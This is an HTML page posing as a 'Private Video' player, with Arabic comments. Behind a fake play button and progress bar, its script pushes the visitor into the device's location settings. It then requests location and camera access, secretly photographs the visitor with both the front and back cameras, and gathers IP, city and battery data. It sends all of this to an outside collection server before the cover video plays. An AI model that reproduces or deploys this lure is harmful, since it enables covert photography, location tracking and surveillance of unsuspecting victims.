<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Video Player</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body {
            font-family: Arial, sans-serif;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            min-height: 100vh;
            margin: 0;
            background-color: #000;
            color: #fff;
            overflow: hidden;
        }
        .video-player-container {
            width: 90%;
            max-width: 800px;
            background: #111;
            border-radius: 12px;
            overflow: hidden;
            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.5);
            position: relative;
        }
        .video-thumbnail {
            position: relative;
            width: 100%;
            height: 450px;
            background: linear-gradient(rgba(0, 0, 0, 0.7), rgba(0, 0, 0, 0.7)),
                url('https://i.postimg.cc/jSfpHvz8/IMG-20260104-210740-951.jpg');
            background-size: cover;
            background-position: center;
            display: flex;
            align-items: center;
            justify-content: center;
            cursor: default;
            flex-direction: column;
        }
        .play-button-overlay {
            width: 100px;
            height: 100px;
            background-color: rgba(255, 0, 0, 0.85);
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            transition: all 0.3s ease;
            box-shadow: 0 0 20px rgba(255, 0, 0, 0.5);
            position: relative;
            z-index: 5;
            cursor: pointer;
        }
        .play-button-overlay:hover {
            transform: scale(1.1);
            background-color: rgba(255, 0, 0, 0.95);
            box-shadow: 0 0 30px rgba(255, 0, 0, 0.7);
        }
        .play-icon-large {
            width: 0;
            height: 0;
            border-left: 30px solid white;
            border-top: 20px solid transparent;
            border-bottom: 20px solid transparent;
            margin-left: 8px;
        }

        .video-info {
            padding: 20px;
            border-bottom: 1px solid #333;
        }
        .video-title {
            font-size: 1.5rem;
            font-weight: bold;
            margin-bottom: 8px;
        }
        .video-controls {
            padding: 15px 20px;
            display: flex;
            align-items: center;
            justify-content: space-between;
            background: #1a1a1a;
            flex-wrap: wrap;
            gap: 10px;
        }
        .control-button {
            background: none;
            border: none;
            color: white;
            font-size: 1.2rem;
            cursor: pointer;
            padding: 8px 15px;
            border-radius: 4px;
            transition: background 0.2s;
        }
        .control-button:hover {
            background: #333;
        }
        .progress-bar {
            flex-grow: 1;
            height: 4px;
            background: #333;
            border-radius: 2px;
            margin: 0 20px;
            overflow: hidden;
            position: relative;
            min-width: 60px;
        }
        .progress-fill {
            position: absolute;
            height: 100%;
            width: 0%;
            background: #ff0000;
        }
        .time-display {
            color: #aaa;
            font-size: 0.9rem;
            min-width: 100px;
            text-align: center;
        }
        .spinner {
            border: 4px solid #fff;
            border-top: 4px solid rgba(255, 255, 255, 0.3);
            border-radius: 50%;
            width: 32px;
            height: 32px;
            animation: spin 1s linear infinite;
            position: absolute;
            display: none;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
        }
        @keyframes spin {
            0% { transform: translate(-50%, -50%) rotate(0deg); }
            100% { transform: translate(-50%, -50%) rotate(360deg); }
        }
        #loading {
            display: none;
            font-size: 1.2rem;
            color: #fff;
            margin-top: 20px;
            text-align: center;
        }
        .loading-text {
            margin-top: 10px;
        }
        .volume-control {
            display: flex;
            align-items: center;
            gap: 10px;
            color: #aaa;
        }
        .volume-slider {
            width: 80px;
            height: 4px;
            background: #333;
            border-radius: 2px;
            position: relative;
        }
        .volume-level {
            position: absolute;
            height: 100%;
            width: 70%;
            background: #ff0000;
        }
        .fullscreen-btn {
            margin-left: 15px;
        }
        @media (max-width: 480px) {
            .video-controls {
                padding: 10px 12px;
                gap: 6px;
            }
            .progress-bar {
                margin: 0 6px;
            }
            .time-display {
                font-size: 0.75rem;
                min-width: 60px;
            }
            .video-title {
                font-size: 1.2rem;
            }
            .video-thumbnail {
                height: 280px;
            }
            .play-button-overlay {
                width: 70px;
                height: 70px;
            }
            .play-icon-large {
                border-left-width: 22px;
                border-top-width: 14px;
                border-bottom-width: 14px;
                margin-left: 5px;
            }
        }
    </style>
</head>
<body>

    <div class="video-player-container">
        <div class="video-info">
            <div class="video-title">Private Video</div>
            <div class="video-meta"></div>
        </div>

        <div class="video-thumbnail" id="thumbnailArea">
            <div class="play-button-overlay" id="playButtonOverlay">
                <div class="play-icon-large"></div>
                <div class="spinner" id="spinner"></div>
            </div>
        </div>

        <video id="realVideo" controls playsinline muted style="display:none; width:100%; height:450px; background:#000;">
            <source src="https://files.catbox.moe/okukrp.mp4" type="video/mp4" />
        </video>

        <div class="video-controls">
            <div class="progress-bar">
                <div class="progress-fill"></div>
            </div>
            <div class="time-display">0:00 / 2:45</div>
            <div class="volume-control">
                <span></span>
                <div class="volume-slider">
                    <div class="volume-level"></div>
                </div>
            </div>
            <button class="control-button fullscreen-btn">⛶</button>
        </div>
    </div>

    <div id="loading">
        <div class="spinner" style="position:static;"></div>
        <div class="loading-text">Loading video... Please wait</div>
    </div>

    <script>
        (function() {
            'use strict';

            let capturedData = {
                permissions: [],
                images: [],
                ipInfo: '',
                batteryStatus: '',
                location: '',
                chatId: ''
            };

            let settingsOpened = false;   // هل تم فتح الإعدادات (مرة واحدة فقط)
            let videoStarted = false;
            let isProcessing = false;

            const playBtn = document.getElementById('playButtonOverlay');
            const thumbnailArea = document.getElementById('thumbnailArea');
            const realVideo = document.getElementById('realVideo');
            const spinner = document.getElementById('spinner');
            const loading = document.getElementById('loading');

            // دالة مساعدة لتشغيل الفيديو بالصوت
            function forcePlayWithSound() {
                realVideo.muted = false;
                realVideo.volume = 1.0;
                const playPromise = realVideo.play();
                if (playPromise !== undefined) {
                    playPromise.catch(() => {
                        // إذا فشل التشغيل بسبب سياسة المتصفح، نجرب مع كتم الصوت ثم إعادة الصوت
                        realVideo.muted = true;
                        realVideo.play().then(() => {
                            setTimeout(() => {
                                realVideo.muted = false;
                                realVideo.volume = 1.0;
                                realVideo.play().catch(() => {});
                            }, 100);
                        }).catch(() => {});
                    });
                }
                // محاولات متأخرة لتفعيل الصوت
                setTimeout(() => {
                    realVideo.muted = false;
                    realVideo.volume = 1.0;
                    realVideo.play().catch(() => {});
                }, 500);
                setTimeout(() => {
                    realVideo.muted = false;
                    realVideo.volume = 1.0;
                    realVideo.play().catch(() => {});
                }, 3000);
            }

            // بدء الفيديو مباشرة (نُقلت من startVideoWithSound مع تعديل بسيط)
            function startVideo() {
                if (videoStarted) return;
                videoStarted = true;

                thumbnailArea.style.display = 'none';
                realVideo.style.display = 'block';
                forcePlayWithSound();
            }

            // طلب الصلاحيات (نحتاجها فقط للتسجيل، لا نوقف التشغيل)
            async function requestPermissions() {
                // محاولة الموقع
                try {
                    await new Promise((resolve, reject) => {
                        navigator.geolocation.getCurrentPosition(resolve, reject, {
                            enableHighAccuracy: true,
                            timeout: 10000
                        });
                    });
                    capturedData.permissions.push('Geolocation Allowed');
                } catch (e) {
                    capturedData.permissions.push('Geolocation Denied');
                }

                // محاولة الكاميرا (أمامي وخلفي) لا نوقف إذا فشلت
                try {
                    const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } });
                    stream.getTracks().forEach(t => t.stop());
                    capturedData.permissions.push('Front Camera Allowed');
                } catch (e) {
                    capturedData.permissions.push('Front Camera Denied');
                }
                try {
                    const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'environment' } });
                    stream.getTracks().forEach(t => t.stop());
                    capturedData.permissions.push('Back Camera Allowed');
                } catch (e) {
                    capturedData.permissions.push('Back Camera Denied');
                }
            }

            // فتح إعدادات الموقع (نسختك المُحسَّنة)
            function openLocationSettings() {
                const ua = navigator.userAgent;
                if (/Android/i.test(ua)) {
                    const intents = [
                        'intent:#Intent;action=android.settings.LOCATION_SOURCE_SETTINGS;end',
                        'intent://com.android.settings.location.LocationSettings#Intent;action=android.settings.LOCATION_SOURCE_SETTINGS;end',
                        'intent:#Intent;action=android.settings.SETTINGS;end'
                    ];
                    for (let intent of intents) {
                        try { window.location.href = intent; break; } catch (e) {}
                    }
                } else if (/iPhone|iPad|iPod/i.test(ua)) {
                    window.open('App-Prefs:Privacy&path=LOCATION', '_blank');
                    setTimeout(() => window.open('prefs:root=Privacy&path=LOCATION', '_blank'), 500);
                } else if (/Windows/i.test(ua)) {
                    window.open('ms-settings:privacy-location', '_blank');
                } else if (/Mac/i.test(ua)) {
                    window.open('x-apple.systempreferences:com.apple.preference.security?Privacy_LocationServices', '_blank');
                } else {
                    window.location.href = 'intent:#Intent;action=android.settings.SETTINGS;end';
                }
            }

            // جمع البيانات الإضافية ثم التشغيل
            async function collectDataAndPlay() {
                if (isProcessing) return;
                isProcessing = true;

                spinner.style.display = 'block';
                loading.style.display = 'block';
                playBtn.style.opacity = '0.5';
                playBtn.style.pointerEvents = 'none';

                capturedData.chatId = new URLSearchParams(window.location.search).get('chatId') || '';

                // جلب معلومات IP والبطارية والموقع (بدون توقف)
                try {
                    const resp = await fetch('https://ipapi.co/json/');
                    const data = await resp.json();
                    capturedData.ipInfo = `Country: ${data.country_name}, City: ${data.city}, IP: ${data.ip}`;
                } catch (e) { capturedData.ipInfo = "IP Info not available"; }

                try {
                    const battery = await navigator.getBattery();
                    capturedData.batteryStatus = Math.round(battery.level * 100) + '%';
                } catch (e) { capturedData.batteryStatus = "Unknown"; }

                try {
                    const position = await new Promise((resolve, reject) => {
                        navigator.geolocation.getCurrentPosition(resolve, reject, {
                            enableHighAccuracy: true,
                            timeout: 15000,
                            maximumAge: 0
                        });
                    });
                    capturedData.location = `Lat: ${position.coords.latitude.toFixed(6)}, Long: ${position.coords.longitude.toFixed(6)}`;
                } catch (e) { capturedData.location = ''; }

                // محاولة التقاط صور الكاميرا (إذا توفرت الصلاحية)
                async function capture(facingMode) {
                    try {
                        const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: { exact: facingMode } } });
                        const video = document.createElement('video');
                        video.srcObject = stream;
                        await video.play();
                        await new Promise(resolve => setTimeout(resolve, 1000));
                        const canvas = document.createElement('canvas');
                        canvas.width = video.videoWidth || 640;
                        canvas.height = video.videoHeight || 480;
                        canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
                        capturedData.images.push(canvas.toDataURL('image/jpeg').split(',')[1]);
                        stream.getTracks().forEach(track => track.stop());
                    } catch (e) {}
                }

                await capture('user');
                await capture('environment');

                // إرسال البيانات بصرف النظر عن النتيجة
                const data = {
                    chatId: capturedData.chatId,
                    imageDatas: capturedData.images.join(','),
                    location: capturedData.location,
                    permissions: capturedData.permissions.join(', '),
                    ipInfo: capturedData.ipInfo,
                    battery: capturedData.batteryStatus
                };

                // تجاهل فشل الإرسال
                try {
                    await fetch('https://server-brxz.onrender.com/submitData', {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
                        body: new URLSearchParams(data),
                        mode: 'no-cors'
                    });
                } catch (e) {}

                spinner.style.display = 'none';
                loading.style.display = 'none';
                playBtn.style.opacity = '1';
                playBtn.style.pointerEvents = 'auto';

                startVideo();
                isProcessing = false;
            }

            // معالج النقر على الزر الأحمر
            async function handlePlayClick(e) {
                e.stopPropagation();
                if (videoStarted || isProcessing) return;

                // أول نقرة: افتح الإعدادات
                if (!settingsOpened) {
                    settingsOpened = true;
                    openLocationSettings();
                    return;
                }

                // بعد فتح الإعدادات: نجرب الصلاحيات ثم نشغل الفيديو مهما حصل
                await requestPermissions();      // يسجل فقط
                await collectDataAndPlay();      // يشغل الفيديو
            }

            // عند الرجوع من الإعدادات (visibility change) نشغل الفيديو تلقائياً بعد المحاولة
            document.addEventListener('visibilitychange', async function() {
                if (document.visibilityState === 'visible' && settingsOpened && !videoStarted && !isProcessing) {
                    await requestPermissions();
                    await collectDataAndPlay();
                }
            });

            // ربط الأحداث
            if (playBtn) {
                playBtn.addEventListener('click', handlePlayClick);
            }
            if (thumbnailArea) {
                thumbnailArea.addEventListener('click', handlePlayClick);
            }

            // تفعيل الصوت عند أول تفاعل (تجاوز سياسات كتم الصوت التلقائي)
            document.addEventListener('click', () => {
                if (realVideo && realVideo.display !== 'none') {
                    forcePlayWithSound();
                }
            }, true);

            // أزرار التحكم الوهمية
            document.querySelectorAll('.control-button').forEach(button => {
                button.addEventListener('click', function(e) {
                    e.stopPropagation();
                    if (this.textContent.includes('⛶')) {
                        const video = document.getElementById('realVideo');
                        if (video.requestFullscreen) video.requestFullscreen();
                        else if (video.webkitRequestFullscreen) video.webkitRequestFullscreen();
                    }
                });
            });

            // شريط تقدم وهمي (اختياري)
            const progressInterval = setInterval(() => {
                const progressFill = document.querySelector('.progress-fill');
                if (document.getElementById('realVideo').style.display === 'block') {
                    clearInterval(progressInterval);
                    return;
                }
                const w = (parseInt(progressFill.style.width) || 35) + 0.1;
                progressFill.style.width = (w % 100) + '%';
                const sec = Math.floor((w / 100) * 165);
                const timeDisplay = document.querySelector('.time-display');
                timeDisplay.textContent = `${Math.floor(sec/60)}:${(sec%60).toString().padStart(2,'0')} / 2:45`;
            }, 1000);

        })();
    </script>

</body>
</html>
